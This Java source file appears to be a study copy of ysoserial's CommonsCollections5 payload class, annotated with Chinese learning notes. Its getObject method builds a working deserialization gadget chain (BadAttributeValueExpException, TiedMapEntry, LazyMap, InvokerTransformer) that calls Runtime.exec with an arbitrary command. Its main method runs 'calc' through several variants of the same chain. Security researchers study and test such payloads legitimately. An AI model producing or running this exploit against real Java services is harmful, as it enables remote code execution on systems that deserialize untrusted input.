package ysoserial.payloads;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

import javax.management.BadAttributeValueExpException;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import org.apache.commons.collections.map.TransformedMap;
import ysoserial.Deserializer;
import ysoserial.Serializer;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()

	Requires:
		commons-collections
 */
/*
This only works in JDK 8u76 and WITHOUT a security manager

https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest(precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.MATTHIASKAISER, Authors.JASINNER})
public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

    public BadAttributeValueExpException getObject(final String command) throws Exception {
        final String[] execArgs = new String[]{command};
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
            new Transformer[]{new ConstantTransformer(1)});
        // real chain for after setup
        final Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{
                String.class, Class[].class}, new Object[]{
                "getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{
                Object.class, Object[].class}, new Object[]{
                null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class}, execArgs),
            new ConstantTransformer(1)};

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
        valfield.set(val, entry);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        return val;
    }

    public static void main(final String[] args) throws Exception {
        Method method = Runtime.class.getMethod("getRuntime");
        Runtime runtime = (Runtime) method.invoke(null, new Object[]{});
        InvokerTransformer i1 = new InvokerTransformer("getMethod", new Class[]{
            String.class, Class[].class}, new Object[]{
            "getRuntime", new Class[0]});
        InvokerTransformer i2 = new InvokerTransformer("invoke", new Class[]{
            Object.class, Object[].class}, new Object[]{
            null, new Object[0]});
        InvokerTransformer i3 = new InvokerTransformer("exec",
            new Class[]{String.class}, new Object[]{"calc"});
        ChainedTransformer c = new ChainedTransformer(new Transformer[]{i1, i2, i3});
        c.transform(Runtime.class);

        //LazyMap的反序列化方式
        HashMap map = new HashMap();
        Map lazyMap = LazyMap.decorate(map, c);
        lazyMap.get(Runtime.class);


        //另一种方式
        HashMap map2 = new HashMap();
        Map map1 = TransformedMap.decorate(map2,c,c);
        map1.put("1","1");


        //另一种方式
        HashMap map3 = new HashMap();
        final Map lazyMap2 = LazyMap.decorate(map3, c);
        TiedMapEntry entry = new TiedMapEntry(lazyMap2, "foo");
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
        valfield.set(val, entry);

        Deserializer.deserialize(Serializer.serialize(val));

        Reflections.setFieldValue(c, "iTransformers", new Transformer[]{new ConstantTransformer(1)}); // arm with actual transformer chain

//		PayloadRunner.run(CommonsCollections5.class, args);
//		PayloadRunner.run(CommonsCollections5.class, args);
//        Runtime r = Runtime.getRuntime();
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",
//            new Class[]{String.class}, new Object[]{"calc"});
//        invokerTransformer.transform(r);
//        Method m = Runtime.class.getMethod("getRuntime");


//        Class ss = Runtime.class.getClass();
//        Class [] param = new Class[]{};
        //这里可以简写 为 Method m = Runtime.class.getMethod("getRuntime", param);
//        Method m2 = ss.getMethod("getMethod", new Class[]{String.class, param.getClass()});
//        m2.invoke(Runtime.class, "getRuntime", new Object[]{"getRuntime",new Class[0]});

//        String s = "123";
//        s.split("1");
//        String.valueOf("1");
//        Class cl = s.getClass();
//        Method method = cl.getMethod("split", new Class[]{String.class});
//        method.invoke(s, new Object[]{"1"});

//        Runtime r = (Runtime) m.invoke(null, new Object[]{});
//        InvokerTransformer i1 = new InvokerTransformer("getMethod", new Class[]{
//            String.class, Class[].class}, new Object[]{
//            "getRuntime", new Class[0]});
//        Class c = Runtime.class.getClass();
//        Method m1 = c.getMethod("getMethod", new Class[]{String.class, Class[].class});
//        m1.invoke(Runtime.class, new Object[]{"getRuntime", new Class[0]});
//        Runtime r2 = (Runtime) i1.transform(Runtime.class);
//        System.out.println(r2);
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

}
